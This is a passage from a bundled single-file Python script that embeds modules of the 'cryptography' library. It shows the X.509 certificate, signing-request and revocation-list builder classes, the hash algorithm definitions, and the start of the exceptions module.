@abc.abstractproperty\r\n    def tbs_certlist_bytes(self) -> bytes:\r\n        """\r\n        Returns the tbsCertList payload bytes as defined in RFC 5280.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __eq__(self, other: object) -> bool:\r\n        """\r\n        Checks equality.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __len__(self) -> int:\r\n        """\r\n        Number of revoked certificates in the CRL.\r\n        """\r\n\r\n    @typing.overload\r\n    def __getitem__(self, idx: int) -> RevokedCertificate:\r\n        ...\r\n\r\n    @typing.overload\r\n    def __getitem__(self, idx: slice) -> typing.List[RevokedCertificate]:\r\n        ...\r\n\r\n    @abc.abstractmethod\r\n    def __getitem__(\r\n        self, idx: typing.Union[int, slice]\r\n    ) -> typing.Union[RevokedCertificate, typing.List[RevokedCertificate]]:\r\n        """\r\n        Returns a revoked certificate (or slice of revoked certificates).\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __iter__(self) -> typing.Iterator[RevokedCertificate]:\r\n        """\r\n        Iterator over the revoked certificates\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def is_signature_valid(\r\n        self, public_key: CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES\r\n    ) -> bool:\r\n        """\r\n        Verifies signature of revocation list against given public key.\r\n        """\r\n\r\n\r\nCertificateRevocationList.register(rust_x509.CertificateRevocationList)\r\n\r\n\r\nclass CertificateSigningRequest(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def __eq__(self, other: object) -> bool:\r\n        """\r\n        Checks equality.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def __hash__(self) -> int:\r\n        """\r\n        Computes a hash.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> CERTIFICATE_PUBLIC_KEY_TYPES:\r\n        """\r\n        Returns the public key\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def subject(self) -> Name:\r\n        """\r\n        Returns the subject name object.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_hash_algorithm(\r\n        self,\r\n    ) -> typing.Optional[hashes.HashAlgorithm]:\r\n        """\r\n        Returns a HashAlgorithm corresponding to the type of the digest signed\r\n        in the certificate.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature_algorithm_oid(self) -> ObjectIdentifier:\r\n        """\r\n        Returns the ObjectIdentifier of the signature algorithm.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def extensions(self) -> Extensions:\r\n        """\r\n        Returns the extensions in the signing request.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def attributes(self) -> Attributes:\r\n        """\r\n        Returns an Attributes object.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(self, encoding: serialization.Encoding) -> bytes:\r\n        """\r\n        Encodes the request to PEM or DER format.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def signature(self) -> bytes:\r\n        """\r\n        Returns the signature bytes.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def tbs_certrequest_bytes(self) -> bytes:\r\n        """\r\n        Returns the PKCS#10 CertificationRequestInfo bytes as defined in RFC\r\n        2986.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def is_signature_valid(self) -> bool:\r\n        """\r\n        Verifies signature of signing request.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def get_attribute_for_oid(self, oid: ObjectIdentifier) -> bytes:\r\n        """\r\n        Get the attribute value for a given OID.\r\n        """\r\n\r\n\r\n# Runtime isinstance checks need this since the rust class is not a subclass.\r\nCertificateSigningRequest.register(rust_x509.CertificateSigningRequest)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_pem_x509_certificate(\r\n    data: bytes, backend: typing.Any = None\r\n) -> Certificate:\r\n    return rust_x509.load_pem_x509_certificate(data)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_der_x509_certificate(\r\n    data: bytes, backend: typing.Any = None\r\n) -> Certificate:\r\n    return rust_x509.load_der_x509_certificate(data)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_pem_x509_csr(\r\n    data: bytes, backend: typing.Any = None\r\n) -> CertificateSigningRequest:\r\n    return rust_x509.load_pem_x509_csr(data)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_der_x509_csr(\r\n    data: bytes, backend: typing.Any = None\r\n) -> CertificateSigningRequest:\r\n    return rust_x509.load_der_x509_csr(data)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_pem_x509_crl(\r\n    data: bytes, backend: typing.Any = None\r\n) -> CertificateRevocationList:\r\n    return rust_x509.load_pem_x509_crl(data)\r\n\r\n\r\n# Backend argument preserved for API compatibility, but ignored.\r\ndef load_der_x509_crl(\r\n    data: bytes, backend: typing.Any = None\r\n) -> CertificateRevocationList:\r\n    return rust_x509.load_der_x509_crl(data)\r\n\r\n\r\nclass CertificateSigningRequestBuilder:\r\n    def __init__(\r\n        self,\r\n        subject_name: typing.Optional[Name] = None,\r\n        extensions: typing.List[Extension[ExtensionType]] = [],\r\n        attributes: typing.List[\r\n            typing.Tuple[ObjectIdentifier, bytes, typing.Optional[int]]\r\n        ] = [],\r\n    ):\r\n        """\r\n        Creates an empty X.509 certificate request (v1).\r\n        """\r\n        self._subject_name = subject_name\r\n        self._extensions = extensions\r\n        self._attributes = attributes\r\n\r\n    def subject_name(self, name: Name) -> "CertificateSigningRequestBuilder":\r\n        """\r\n        Sets the certificate requestor\'s distinguished name.\r\n        """\r\n        if not isinstance(name, Name):\r\n            raise TypeError("Expecting x509.Name object.")\r\n        if self._subject_name is not None:\r\n            raise ValueError("The subject name may only be set once.")\r\n        return CertificateSigningRequestBuilder(\r\n            name, self._extensions, self._attributes\r\n        )\r\n\r\n    def add_extension(\r\n        self, extval: ExtensionType, critical: bool\r\n    ) -> "CertificateSigningRequestBuilder":\r\n        """\r\n        Adds an X.509 extension to the certificate request.\r\n        """\r\n        if not isinstance(extval, ExtensionType):\r\n            raise TypeError("extension must be an ExtensionType")\r\n\r\n        extension = Extension(extval.oid, critical, extval)\r\n        _reject_duplicate_extension(extension, self._extensions)\r\n\r\n        return CertificateSigningRequestBuilder(\r\n            self._subject_name,\r\n            self._extensions + [extension],\r\n            self._attributes,\r\n        )\r\n\r\n    def add_attribute(\r\n        self,\r\n        oid: ObjectIdentifier,\r\n        value: bytes,\r\n        *,\r\n        _tag: typing.Optional[_ASN1Type] = None,\r\n    ) -> "CertificateSigningRequestBuilder":\r\n        """\r\n        Adds an X.509 attribute with an OID and associated value.\r\n        """\r\n        if not isinstance(oid, ObjectIdentifier):\r\n            raise TypeError("oid must be an ObjectIdentifier")\r\n\r\n        if not isinstance(value, bytes):\r\n            raise TypeError("value must be bytes")\r\n\r\n        if _tag is not None and not isinstance(_tag, _ASN1Type):\r\n            raise TypeError("tag must be _ASN1Type")\r\n\r\n        _reject_duplicate_attribute(oid, self._attributes)\r\n\r\n        if _tag is not None:\r\n            tag = _tag.value\r\n        else:\r\n            tag = None\r\n\r\n        return CertificateSigningRequestBuilder(\r\n            self._subject_name,\r\n            self._extensions,\r\n            self._attributes + [(oid, value, tag)],\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        private_key: CERTIFICATE_PRIVATE_KEY_TYPES,\r\n        algorithm: typing.Optional[hashes.HashAlgorithm],\r\n        backend: typing.Any = None,\r\n    ) -> CertificateSigningRequest:\r\n        """\r\n        Signs the request using the requestor\'s private key.\r\n        """\r\n        if self._subject_name is None:\r\n            raise ValueError("A CertificateSigningRequest must have a subject")\r\n        return rust_x509.create_x509_csr(self, private_key, algorithm)\r\n\r\n\r\nclass CertificateBuilder:\r\n    _extensions: typing.List[Extension[ExtensionType]]\r\n\r\n    def __init__(\r\n        self,\r\n        issuer_name: typing.Optional[Name] = None,\r\n        subject_name: typing.Optional[Name] = None,\r\n        public_key: typing.Optional[CERTIFICATE_PUBLIC_KEY_TYPES] = None,\r\n        serial_number: typing.Optional[int] = None,\r\n        not_valid_before: typing.Optional[datetime.datetime] = None,\r\n        not_valid_after: typing.Optional[datetime.datetime] = None,\r\n        extensions: typing.List[Extension[ExtensionType]] = [],\r\n    ) -> None:\r\n        self._version = Version.v3\r\n        self._issuer_name = issuer_name\r\n        self._subject_name = subject_name\r\n        self._public_key = public_key\r\n        self._serial_number = serial_number\r\n        self._not_valid_before = not_valid_before\r\n        self._not_valid_after = not_valid_after\r\n        self._extensions = extensions\r\n\r\n    def issuer_name(self, name: Name) -> "CertificateBuilder":\r\n        """\r\n        Sets the CA\'s distinguished name.\r\n        """\r\n        if not isinstance(name, Name):\r\n            raise TypeError("Expecting x509.Name object.")\r\n        if self._issuer_name is not None:\r\n            raise ValueError("The issuer name may only be set once.")\r\n        return CertificateBuilder(\r\n            name,\r\n            self._subject_name,\r\n            self._public_key,\r\n            self._serial_number,\r\n            self._not_valid_before,\r\n            self._not_valid_after,\r\n            self._extensions,\r\n        )\r\n\r\n    def subject_name(self, name: Name) -> "CertificateBuilder":\r\n        """\r\n        Sets the requestor\'s distinguished name.\r\n        """\r\n        if not isinstance(name, Name):\r\n            raise TypeError("Expecting x509.Name object.")\r\n        if self._subject_name is not None:\r\n            raise ValueError("The subject name may only be set once.")\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            name,\r\n            self._public_key,\r\n            self._serial_number,\r\n            self._not_valid_before,\r\n            self._not_valid_after,\r\n            self._extensions,\r\n        )\r\n\r\n    def public_key(\r\n        self,\r\n        key: CERTIFICATE_PUBLIC_KEY_TYPES,\r\n    ) -> "CertificateBuilder":\r\n        """\r\n        Sets the requestor\'s public key (as found in the signing request).\r\n        """\r\n        if not isinstance(\r\n            key,\r\n            (\r\n                dsa.DSAPublicKey,\r\n                rsa.RSAPublicKey,\r\n                ec.EllipticCurvePublicKey,\r\n                ed25519.Ed25519PublicKey,\r\n                ed448.Ed448PublicKey,\r\n                x25519.X25519PublicKey,\r\n                x448.X448PublicKey,\r\n            ),\r\n        ):\r\n            raise TypeError(\r\n                "Expecting one of DSAPublicKey, RSAPublicKey,"\r\n                " EllipticCurvePublicKey, Ed25519PublicKey,"\r\n                " Ed448PublicKey, X25519PublicKey, or "\r\n                "X448PublicKey."\r\n            )\r\n        if self._public_key is not None:\r\n            raise ValueError("The public key may only be set once.")\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            self._subject_name,\r\n            key,\r\n            self._serial_number,\r\n            self._not_valid_before,\r\n            self._not_valid_after,\r\n            self._extensions,\r\n        )\r\n\r\n    def serial_number(self, number: int) -> "CertificateBuilder":\r\n        """\r\n        Sets the certificate serial number.\r\n        """\r\n        if not isinstance(number, int):\r\n            raise TypeError("Serial number must be of integral type.")\r\n        if self._serial_number is not None:\r\n            raise ValueError("The serial number may only be set once.")\r\n        if number <= 0:\r\n            raise ValueError("The serial number should be positive.")\r\n\r\n        # ASN.1 integers are always signed, so most significant bit must be\r\n        # zero.\r\n        if number.bit_length() >= 160:  # As defined in RFC 5280\r\n            raise ValueError(\r\n                "The serial number should not be more than 159 " "bits."\r\n            )\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            self._subject_name,\r\n            self._public_key,\r\n            number,\r\n            self._not_valid_before,\r\n            self._not_valid_after,\r\n            self._extensions,\r\n        )\r\n\r\n    def not_valid_before(\r\n        self, time: datetime.datetime\r\n    ) -> "CertificateBuilder":\r\n        """\r\n        Sets the certificate activation time.\r\n        """\r\n        if not isinstance(time, datetime.datetime):\r\n            raise TypeError("Expecting datetime object.")\r\n        if self._not_valid_before is not None:\r\n            raise ValueError("The not valid before may only be set once.")\r\n        time = _convert_to_naive_utc_time(time)\r\n        if time < _EARLIEST_UTC_TIME:\r\n            raise ValueError(\r\n                "The not valid before date must be on or after"\r\n                " 1950 January 1)."\r\n            )\r\n        if self._not_valid_after is not None and time > self._not_valid_after:\r\n            raise ValueError(\r\n                "The not valid before date must be before the not valid after "\r\n                "date."\r\n            )\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            self._subject_name,\r\n            self._public_key,\r\n            self._serial_number,\r\n            time,\r\n            self._not_valid_after,\r\n            self._extensions,\r\n        )\r\n\r\n    def not_valid_after(self, time: datetime.datetime) -> "CertificateBuilder":\r\n        """\r\n        Sets the certificate expiration time.\r\n        """\r\n        if not isinstance(time, datetime.datetime):\r\n            raise TypeError("Expecting datetime object.")\r\n        if self._not_valid_after is not None:\r\n            raise ValueError("The not valid after may only be set once.")\r\n        time = _convert_to_naive_utc_time(time)\r\n        if time < _EARLIEST_UTC_TIME:\r\n            raise ValueError(\r\n                "The not valid after date must be on or after"\r\n                " 1950 January 1."\r\n            )\r\n        if (\r\n            self._not_valid_before is not None\r\n            and time < self._not_valid_before\r\n        ):\r\n            raise ValueError(\r\n                "The not valid after date must be after the not valid before "\r\n                "date."\r\n            )\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            self._subject_name,\r\n            self._public_key,\r\n            self._serial_number,\r\n            self._not_valid_before,\r\n            time,\r\n            self._extensions,\r\n        )\r\n\r\n    def add_extension(\r\n        self, extval: ExtensionType, critical: bool\r\n    ) -> "CertificateBuilder":\r\n        """\r\n        Adds an X.509 extension to the certificate.\r\n        """\r\n        if not isinstance(extval, ExtensionType):\r\n            raise TypeError("extension must be an ExtensionType")\r\n\r\n        extension = Extension(extval.oid, critical, extval)\r\n        _reject_duplicate_extension(extension, self._extensions)\r\n\r\n        return CertificateBuilder(\r\n            self._issuer_name,\r\n            self._subject_name,\r\n            self._public_key,\r\n            self._serial_number,\r\n            self._not_valid_before,\r\n            self._not_valid_after,\r\n            self._extensions + [extension],\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        private_key: CERTIFICATE_PRIVATE_KEY_TYPES,\r\n        algorithm: typing.Optional[hashes.HashAlgorithm],\r\n        backend: typing.Any = None,\r\n    ) -> Certificate:\r\n        """\r\n        Signs the certificate using the CA\'s private key.\r\n        """\r\n        if self._subject_name is None:\r\n            raise ValueError("A certificate must have a subject name")\r\n\r\n        if self._issuer_name is None:\r\n            raise ValueError("A certificate must have an issuer name")\r\n\r\n        if self._serial_number is None:\r\n            raise ValueError("A certificate must have a serial number")\r\n\r\n        if self._not_valid_before is None:\r\n            raise ValueError("A certificate must have a not valid before time")\r\n\r\n        if self._not_valid_after is None:\r\n            raise ValueError("A certificate must have a not valid after time")\r\n\r\n        if self._public_key is None:\r\n            raise ValueError("A certificate must have a public key")\r\n\r\n        return rust_x509.create_x509_certificate(self, private_key, algorithm)\r\n\r\n\r\nclass CertificateRevocationListBuilder:\r\n    _extensions: typing.List[Extension[ExtensionType]]\r\n    _revoked_certificates: typing.List[RevokedCertificate]\r\n\r\n    def __init__(\r\n        self,\r\n        issuer_name: typing.Optional[Name] = None,\r\n        last_update: typing.Optional[datetime.datetime] = None,\r\n        next_update: typing.Optional[datetime.datetime] = None,\r\n        extensions: typing.List[Extension[ExtensionType]] = [],\r\n        revoked_certificates: typing.List[RevokedCertificate] = [],\r\n    ):\r\n        self._issuer_name = issuer_name\r\n        self._last_update = last_update\r\n        self._next_update = next_update\r\n        self._extensions = extensions\r\n        self._revoked_certificates = revoked_certificates\r\n\r\n    def issuer_name(\r\n        self, issuer_name: Name\r\n    ) -> "CertificateRevocationListBuilder":\r\n        if not isinstance(issuer_name, Name):\r\n            raise TypeError("Expecting x509.Name object.")\r\n        if self._issuer_name is not None:\r\n            raise ValueError("The issuer name may only be set once.")\r\n        return CertificateRevocationListBuilder(\r\n            issuer_name,\r\n            self._last_update,\r\n            self._next_update,\r\n            self._extensions,\r\n            self._revoked_certificates,\r\n        )\r\n\r\n    def last_update(\r\n        self, last_update: datetime.datetime\r\n    ) -> "CertificateRevocationListBuilder":\r\n        if not isinstance(last_update, datetime.datetime):\r\n            raise TypeError("Expecting datetime object.")\r\n        if self._last_update is not None:\r\n            raise ValueError("Last update may only be set once.")\r\n        last_update = _convert_to_naive_utc_time(last_update)\r\n        if last_update < _EARLIEST_UTC_TIME:\r\n            raise ValueError(\r\n                "The last update date must be on or after" " 1950 January 1."\r\n            )\r\n        if self._next_update is not None and last_update > self._next_update:\r\n            raise ValueError(\r\n                "The last update date must be before the next update date."\r\n            )\r\n        return CertificateRevocationListBuilder(\r\n            self._issuer_name,\r\n            last_update,\r\n            self._next_update,\r\n            self._extensions,\r\n            self._revoked_certificates,\r\n        )\r\n\r\n    def next_update(\r\n        self, next_update: datetime.datetime\r\n    ) -> "CertificateRevocationListBuilder":\r\n        if not isinstance(next_update, datetime.datetime):\r\n            raise TypeError("Expecting datetime object.")\r\n        if self._next_update is not None:\r\n            raise ValueError("Last update may only be set once.")\r\n        next_update = _convert_to_naive_utc_time(next_update)\r\n        if next_update < _EARLIEST_UTC_TIME:\r\n            raise ValueError(\r\n                "The last update date must be on or after" " 1950 January 1."\r\n            )\r\n        if self._last_update is not None and next_update < self._last_update:\r\n            raise ValueError(\r\n                "The next update date must be after the last update date."\r\n            )\r\n        return CertificateRevocationListBuilder(\r\n            self._issuer_name,\r\n            self._last_update,\r\n            next_update,\r\n            self._extensions,\r\n            self._revoked_certificates,\r\n        )\r\n\r\n    def add_extension(\r\n        self, extval: ExtensionType, critical: bool\r\n    ) -> "CertificateRevocationListBuilder":\r\n        """\r\n        Adds an X.509 extension to the certificate revocation list.\r\n        """\r\n        if not isinstance(extval, ExtensionType):\r\n            raise TypeError("extension must be an ExtensionType")\r\n\r\n        extension = Extension(extval.oid, critical, extval)\r\n        _reject_duplicate_extension(extension, self._extensions)\r\n        return CertificateRevocationListBuilder(\r\n            self._issuer_name,\r\n            self._last_update,\r\n            self._next_update,\r\n            self._extensions + [extension],\r\n            self._revoked_certificates,\r\n        )\r\n\r\n    def add_revoked_certificate(\r\n        self, revoked_certificate: RevokedCertificate\r\n    ) -> "CertificateRevocationListBuilder":\r\n        """\r\n        Adds a revoked certificate to the CRL.\r\n        """\r\n        if not isinstance(revoked_certificate, RevokedCertificate):\r\n            raise TypeError("Must be an instance of RevokedCertificate")\r\n\r\n        return CertificateRevocationListBuilder(\r\n            self._issuer_name,\r\n            self._last_update,\r\n            self._next_update,\r\n            self._extensions,\r\n            self._revoked_certificates + [revoked_certificate],\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        private_key: CERTIFICATE_PRIVATE_KEY_TYPES,\r\n        algorithm: typing.Optional[hashes.HashAlgorithm],\r\n        backend: typing.Any = None,\r\n    ) -> CertificateRevocationList:\r\n        if self._issuer_name is None:\r\n            raise ValueError("A CRL must have an issuer name")\r\n\r\n        if self._last_update is None:\r\n            raise ValueError("A CRL must have a last update time")\r\n\r\n        if self._next_update is None:\r\n            raise ValueError("A CRL must have a next update time")\r\n\r\n        return rust_x509.create_x509_crl(self, private_key, algorithm)\r\n\r\n\r\nclass RevokedCertificateBuilder:\r\n    def __init__(\r\n        self,\r\n        serial_number: typing.Optional[int] = None,\r\n        revocation_date: typing.Optional[datetime.datetime] = None,\r\n        extensions: typing.List[Extension[ExtensionType]] = [],\r\n    ):\r\n        self._serial_number = serial_number\r\n        self._revocation_date = revocation_date\r\n        self._extensions = extensions\r\n\r\n    def serial_number(self, number: int) -> "RevokedCertificateBuilder":\r\n        if not isinstance(number, int):\r\n            raise TypeError("Serial number must be of integral type.")\r\n        if self._serial_number is not None:\r\n            raise ValueError("The serial number may only be set once.")\r\n        if number <= 0:\r\n            raise ValueError("The serial number should be positive")\r\n\r\n        # ASN.1 integers are always signed, so most significant bit must be\r\n        # zero.\r\n        if number.bit_length() >= 160:  # As defined in RFC 5280\r\n            raise ValueError(\r\n                "The serial number should not be more than 159 " "bits."\r\n            )\r\n        return RevokedCertificateBuilder(\r\n            number, self._revocation_date, self._extensions\r\n        )\r\n\r\n    def revocation_date(\r\n        self, time: datetime.datetime\r\n    ) -> "RevokedCertificateBuilder":\r\n        if not isinstance(time, datetime.datetime):\r\n            raise TypeError("Expecting datetime object.")\r\n        if self._revocation_date is not None:\r\n            raise ValueError("The revocation date may only be set once.")\r\n        time = _convert_to_naive_utc_time(time)\r\n        if time < _EARLIEST_UTC_TIME:\r\n            raise ValueError(\r\n                "The revocation date must be on or after" " 1950 January 1."\r\n            )\r\n        return RevokedCertificateBuilder(\r\n            self._serial_number, time, self._extensions\r\n        )\r\n\r\n    def add_extension(\r\n        self, extval: ExtensionType, critical: bool\r\n    ) -> "RevokedCertificateBuilder":\r\n        if not isinstance(extval, ExtensionType):\r\n            raise TypeError("extension must be an ExtensionType")\r\n\r\n        extension = Extension(extval.oid, critical, extval)\r\n        _reject_duplicate_extension(extension, self._extensions)\r\n        return RevokedCertificateBuilder(\r\n            self._serial_number,\r\n            self._revocation_date,\r\n            self._extensions + [extension],\r\n        )\r\n\r\n    def build(self, backend: typing.Any = None) -> RevokedCertificate:\r\n        if self._serial_number is None:\r\n            raise ValueError("A revoked certificate must have a serial number")\r\n        if self._revocation_date is None:\r\n            raise ValueError(\r\n                "A revoked certificate must have a revocation date"\r\n            )\r\n        return _RawRevokedCertificate(\r\n            self._serial_number,\r\n            self._revocation_date,\r\n            Extensions(self._extensions),\r\n        )\r\n\r\n\r\ndef random_serial_number() -> int:\r\n    return int.from_bytes(os.urandom(20), "big") >> 1\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/hashes.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.exceptions import (\r\n    AlreadyFinalized,\r\n)\r\n\r\n\r\nclass HashAlgorithm(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def name(self) -> str:\r\n        """\r\n        A string naming this algorithm (e.g. "sha256", "md5").\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def digest_size(self) -> int:\r\n        """\r\n        The size of the resulting digest in bytes.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def block_size(self) -> typing.Optional[int]:\r\n        """\r\n        The internal block size of the hash function, or None if the hash\r\n        function does not use blocks internally (e.g. SHA3).\r\n        """\r\n\r\n\r\nclass HashContext(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def algorithm(self) -> HashAlgorithm:\r\n        """\r\n        A HashAlgorithm that will be used by this context.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def update(self, data: bytes) -> None:\r\n        """\r\n        Processes the provided bytes through the hash.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def finalize(self) -> bytes:\r\n        """\r\n        Finalizes the hash context and returns the hash digest as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def copy(self) -> "HashContext":\r\n        """\r\n        Return a HashContext that is a copy of the current context.\r\n        """\r\n\r\n\r\nclass ExtendableOutputFunction(metaclass=abc.ABCMeta):\r\n    """\r\n    An interface for extendable output functions.\r\n    """\r\n\r\n\r\nclass Hash(HashContext):\r\n    _ctx: typing.Optional[HashContext]\r\n\r\n    def __init__(\r\n        self,\r\n        algorithm: HashAlgorithm,\r\n        backend: typing.Any = None,\r\n        ctx: typing.Optional["HashContext"] = None,\r\n    ):\r\n        if not isinstance(algorithm, HashAlgorithm):\r\n            raise TypeError("Expected instance of hashes.HashAlgorithm.")\r\n        self._algorithm = algorithm\r\n\r\n        if ctx is None:\r\n            from cryptography.hazmat.backends.openssl.backend import (\r\n                backend as ossl,\r\n            )\r\n\r\n            self._ctx = ossl.create_hash_ctx(self.algorithm)\r\n        else:\r\n            self._ctx = ctx\r\n\r\n    @property\r\n    def algorithm(self) -> HashAlgorithm:\r\n        return self._algorithm\r\n\r\n    def update(self, data: bytes) -> None:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        utils._check_byteslike("data", data)\r\n        self._ctx.update(data)\r\n\r\n    def copy(self) -> "Hash":\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        return Hash(self.algorithm, ctx=self._ctx.copy())\r\n\r\n    def finalize(self) -> bytes:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        digest = self._ctx.finalize()\r\n        self._ctx = None\r\n        return digest\r\n\r\n\r\nclass SHA1(HashAlgorithm):\r\n    name = "sha1"\r\n    digest_size = 20\r\n    block_size = 64\r\n\r\n\r\nclass SHA512_224(HashAlgorithm):  # noqa: N801\r\n    name = "sha512-224"\r\n    digest_size = 28\r\n    block_size = 128\r\n\r\n\r\nclass SHA512_256(HashAlgorithm):  # noqa: N801\r\n    name = "sha512-256"\r\n    digest_size = 32\r\n    block_size = 128\r\n\r\n\r\nclass SHA224(HashAlgorithm):\r\n    name = "sha224"\r\n    digest_size = 28\r\n    block_size = 64\r\n\r\n\r\nclass SHA256(HashAlgorithm):\r\n    name = "sha256"\r\n    digest_size = 32\r\n    block_size = 64\r\n\r\n\r\nclass SHA384(HashAlgorithm):\r\n    name = "sha384"\r\n    digest_size = 48\r\n    block_size = 128\r\n\r\n\r\nclass SHA512(HashAlgorithm):\r\n    name = "sha512"\r\n    digest_size = 64\r\n    block_size = 128\r\n\r\n\r\nclass SHA3_224(HashAlgorithm):  # noqa: N801\r\n    name = "sha3-224"\r\n    digest_size = 28\r\n    block_size = None\r\n\r\n\r\nclass SHA3_256(HashAlgorithm):  # noqa: N801\r\n    name = "sha3-256"\r\n    digest_size = 32\r\n    block_size = None\r\n\r\n\r\nclass SHA3_384(HashAlgorithm):  # noqa: N801\r\n    name = "sha3-384"\r\n    digest_size = 48\r\n    block_size = None\r\n\r\n\r\nclass SHA3_512(HashAlgorithm):  # noqa: N801\r\n    name = "sha3-512"\r\n    digest_size = 64\r\n    block_size = None\r\n\r\n\r\nclass SHAKE128(HashAlgorithm, ExtendableOutputFunction):\r\n    name = "shake128"\r\n    block_size = None\r\n\r\n    def __init__(self, digest_size: int):\r\n        if not isinstance(digest_size, int):\r\n            raise TypeError("digest_size must be an integer")\r\n\r\n        if digest_size < 1:\r\n            raise ValueError("digest_size must be a positive integer")\r\n\r\n        self._digest_size = digest_size\r\n\r\n    @property\r\n    def digest_size(self) -> int:\r\n        return self._digest_size\r\n\r\n\r\nclass SHAKE256(HashAlgorithm, ExtendableOutputFunction):\r\n    name = "shake256"\r\n    block_size = None\r\n\r\n    def __init__(self, digest_size: int):\r\n        if not isinstance(digest_size, int):\r\n            raise TypeError("digest_size must be an integer")\r\n\r\n        if digest_size < 1:\r\n            raise ValueError("digest_size must be a positive integer")\r\n\r\n        self._digest_size = digest_size\r\n\r\n    @property\r\n    def digest_size(self) -> int:\r\n        return self._digest_size\r\n\r\n\r\nclass MD5(HashAlgorithm):\r\n    name = "md5"\r\n    digest_size = 16\r\n    block_size = 64\r\n\r\n\r\nclass BLAKE2b(HashAlgorithm):\r\n    name = "blake2b"\r\n    _max_digest_size = 64\r\n    _min_digest_size = 1\r\n    block_size = 128\r\n\r\n    def __init__(self, digest_size: int):\r\n\r\n        if digest_size != 64:\r\n            raise ValueError("Digest size must be 64")\r\n\r\n        self._digest_size = digest_size\r\n\r\n    @property\r\n    def digest_size(self) -> int:\r\n        return self._digest_size\r\n\r\n\r\nclass BLAKE2s(HashAlgorithm):\r\n    name = "blake2s"\r\n    block_size = 64\r\n    _max_digest_size = 32\r\n    _min_digest_size = 1\r\n\r\n    def __init__(self, digest_size: int):\r\n\r\n        if digest_size != 32:\r\n            raise ValueError("Digest size must be 32")\r\n\r\n        self._digest_size = digest_size\r\n\r\n    @property\r\n    def digest_size(self) -> int:\r\n        return self._digest_size\r\n\r\n\r\nclass SM3(HashAlgorithm):\r\n    name = "sm3"\r\n    digest_size = 32\r\n    block_size = 64\r\n')
    __stickytape_write_module('cryptography/exceptions.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport typing\r\n\r\nfrom cryptography import utils\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.bindings.openssl.binding import (\r\n        _OpenSSLErrorWithText,\r\n    )\r\n\r\n\r\nclass _Reasons(utils.Enum):\r\n    BACKEND_MISSING_INTERFACE = 0\r\n    UNSUPPORTED_HASH = 1\r\n    UNSUPPORTED_CIPHER = 2\r\n    UNSUPPORTED_PADDING = 3\r\n    UNSUPPORTED_MGF = 4\r\n    UNSUPPORTED_PUBLIC_KEY_ALGORITHM = 5\r\n    UNSUPPORTED_ELLIPTIC_CURVE = 6\r\n    UNSUPPORTED_SERIALIZATION = 7\r\n    UNSUPPORTED_X509 = 8\r\n    UNSUPPORTED_EXCHANGE_ALGORITHM = 9\r\n    UNSUPPORTED_DIFFIE_HELLMAN = 10\r\n    UNSUPPORTED_MAC = 11\r\n\r\n\r\nclass UnsupportedAlgorithm(Exception):\r\n    def __init__(\r\n        self, message: str, reason: typing.Optional[_Reasons] = None\r\n    ) -> None:\r\n        super(UnsupportedAlgorithm, self).__init__(message)\r\n        self._reason = reason\r\n\r\n\r\nclass AlreadyFinalized(Exception):\r\n    pass\r\n\r\n\r\nclass AlreadyUpdated(Exception):\r\n    pass\r\n\r\n\r\nclass NotYetFinalized(Exception):\r\n    pass\r\n\r\n\r\nclass InvalidTag(Exception):\r\n    pass\r\n\r\n\r\nclass InvalidSignature(Exception):\r\n    pass\r\n\r\n\r\nclass InternalError(Exception):\r\n    def __init__(\r\n        self, msg: str, err_code: 